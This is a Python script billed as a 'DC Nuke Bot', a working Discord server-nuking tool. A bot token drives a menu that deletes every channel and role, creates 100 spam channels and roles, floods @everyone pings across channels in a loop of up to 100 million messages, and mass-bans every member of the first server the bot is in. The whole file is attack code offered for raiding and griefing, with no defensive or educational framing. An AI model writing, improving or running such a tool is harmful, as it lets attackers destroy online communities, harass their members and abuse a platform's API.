import pip
import asyncio
import os
import random

a = "discord"
def install(package):
    if hasattr(pip, 'main'):
        pip.main(['install', package])
    else:
        pip._internal.main(['install', package])

if __name__ == '__main__':
    install(a)

import discord
from discord.ext import commands

try:
    with open("bottoken", 'r') as file:
        TOKEN = file.read().strip()
except FileNotFoundError:
    print("File not found.")

os.system("cls")

menu = '''

██████╗░░█████╗░  ███╗░░██╗██╗░░░██╗██╗░░██╗███████╗  ██████╗░░█████╗░████████╗
██╔══██╗██╔══██╗  ████╗░██║██║░░░██║██║░██╔╝██╔════╝  ██╔══██╗██╔══██╗╚══██╔══╝
██║░░██║██║░░╚═╝  ██╔██╗██║██║░░░██║█████═╝░█████╗░░  ██████╦╝██║░░██║░░░██║░░░
██║░░██║██║░░██╗  ██║╚████║██║░░░██║██╔═██╗░██╔══╝░░  ██╔══██╗██║░░██║░░░██║░░░
██████╔╝╚█████╔╝  ██║░╚███║╚██████╔╝██║░╚██╗███████╗  ██████╦╝╚█████╔╝░░░██║░░░
╚═════╝░░╚════╝░  ╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚══════╝  ╚═════╝░░╚════╝░░░░╚═╝░░░

! Make sure the bot is only in ONE server !

[s]: Set bot token
[1]: Delete channels
[2]: Channel maker
[3]: Role maker
[4]: Everyone spammer ( 1k/minute )
[5]: Delete all roles
[6]: Ban all
'''
print(menu)
aa = input("[]: ")

if aa == "s":
    if os.path.isfile("bottoken"):
        os.remove("bottoken")
    os.system("cls")
    settoken = input("[Your bots token]: ")
    with open("bottoken", "a+") as f:
        f.write(settoken)
    os.startfile("runner.py")


# channel deleter (requires 'Manage Channels' permission)
if aa == "1":
    intents = discord.Intents.default()
    intents.guilds = True
    bot = commands.Bot(command_prefix='!', intents=intents)

    @bot.event
    async def on_ready():
        print(f'{bot.user.name} has connected to Discord!')
        guild = bot.guilds[0]
        delete_tasks = [channel.delete() for channel in guild.channels]
        await asyncio.gather(*delete_tasks)
        print("All channels have been nuked! 💥")
        os.startfile("runner.py")
        exit()

    bot.run(TOKEN)


# channel maker (requires 'Manage Channels' permission)
if aa == "2":
    cname = input("Name of the channels: ")
    intents = discord.Intents.default()
    intents.guilds = True 
    bot = commands.Bot(command_prefix='!', intents=intents)

    @bot.event
    async def on_ready():
        print(f'{bot.user.name} has connected to Discord!')
        guild = bot.guilds[0]
        for _ in range(100):
            await guild.create_text_channel(cname)
        print("100 channels have been created")
        os.startfile("runner.py")
        exit()

    bot.run(TOKEN)


# role maker (requires 'Manage Roles' permission)
if aa == "3":
    rname = input("Spam roles name: ")
    intents = discord.Intents.default()
    intents.guilds = True  
    bot = commands.Bot(command_prefix='!', intents=intents)

    @bot.event
    async def on_ready():
        print(f'{bot.user.name} has connected to Discord!')
        guild = bot.guilds[0]
        for _ in range(100):
            await guild.create_role(name=rname, color=discord.Color.default())
        print("A new role has been created")
        os.startfile("runner.py")
        exit()

    bot.run(TOKEN)


# everyone spammer (requires 'Send Messages' permission)
if aa == "4":
    intents = discord.Intents.default()
    intents.guilds = True 
    bot = commands.Bot(command_prefix='!', intents=intents)

    @bot.event
    async def on_ready():
        print(f'{bot.user.name} has connected to Discord!')
        guild = bot.guilds[0]
        channels = guild.text_channels
        count = 0
        batch_size = 100

        async def send_message(channel):
            await channel.send("@everyone")
            os.system("cls")
            print("If you think its slow, make more channels | Everyone spam sent")

        while count < 100000000:
            tasks = []
            for _ in range(batch_size):
                random_channel = random.choice(channels)
                task = asyncio.create_task(send_message(random_channel))
                tasks.append(task)
                count += 1
            await asyncio.gather(*tasks)
            await asyncio.sleep(0.1)

    bot.run(TOKEN)


# role remover (requires 'Manage Roles' permission)
if aa == "5":
    intents = discord.Intents.default()
    intents.guilds = True
    intents.members = True
    bot = commands.Bot(command_prefix='!', intents=intents)

    @bot.event
    async def on_ready():
        print(f'{bot.user.name} has connected to Discord!')
        guild = bot.guilds[0]
        roles = [role for role in guild.roles if role.name != "@everyone"]
        delete_tasks = [role.delete() for role in roles]
        await asyncio.gather(*delete_tasks)
        print("All roles have been deleted")
        os.startfile("runner.py")
        exit()

    bot.run(TOKEN)


# ban all (requires 'Ban Members' permission)
if aa == "6":
    intents = discord.Intents.default()
    intents.members = True
    intents.guilds = True
    bot = commands.Bot(command_prefix='!', intents=intents)

    @bot.event
    async def on_ready():
        print(f'{bot.user.name} has connected to Discord!')
        guild = bot.guilds[0]
        bot_user = bot.user
        members = [member for member in guild.members if member != bot_user]
        batch_size = 100 

        async def ban_member(member):
            try:
                await member.ban(reason="Mass ban script")
            except Exception as e:
                print(f"Failed to ban {member.name}: {e}")

        while members:
            batch = members[:batch_size]
            members = members[batch_size:]
            tasks = [ban_member(member) for member in batch]
            await asyncio.gather(*tasks)
            await asyncio.sleep(0.1) 

        print("All members have been banned, errors are normal here")
        os.startfile("runner.py")
        exit()

    bot.run(TOKEN)
